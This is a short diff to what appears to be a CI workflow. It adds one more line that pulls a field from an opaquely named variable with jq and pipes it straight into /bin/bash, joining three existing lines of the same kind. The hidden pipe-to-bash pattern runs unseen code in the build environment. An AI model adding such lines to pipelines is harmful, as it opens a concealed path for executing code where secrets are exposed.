@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$w5" | jq -r .qex947 | /bin/bash
           echo $pr1 | jq -r .s1641 | /bin/bash
           echo $aw976 | jq -r .g0 | /bin/bash
+          printf '%s' "$usd90443" | jq -r .abo7 | /bin/bash
 
       - name: Archive output
         if: always()
